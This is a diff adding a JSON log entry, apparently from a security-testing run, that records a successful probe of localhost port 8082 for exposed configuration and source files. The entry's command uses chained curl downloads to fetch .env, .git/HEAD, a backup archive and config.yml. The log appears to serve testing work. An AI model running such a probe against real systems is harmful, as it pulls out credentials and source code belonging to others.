@@ -1,0 +1,15 @@
+{
+  "timestamp": "2026-04-12T12:43:28.624772",
+  "target": "localhost",
+  "vulnerability": "Exposed Sensitive Configuration and Source Code Disclosure",
+  "tool": "manual",
+  "module": "N/A",
+  "result": {
+    "success": true,
+    "output": "[EXECUTED]\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     0\n100 75055 100 75055   0     0  5330k     0  --:--:-- --:--:-- --:--:--  5638k\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0   0     0   0     ",
+    "tool": "manual",
+    "command": "curl -O http://localhost:8082/.env && curl -O http://localhost:8082/.git/HEAD && curl -O http://localhost:8082/backup.tar.gz && curl -O http://localhost:8082/config.yml",
+    "vulnerability": "Exposed Sensitive Configuration and Source Code Disclosure",
+    "port": 8082
+  }
+}
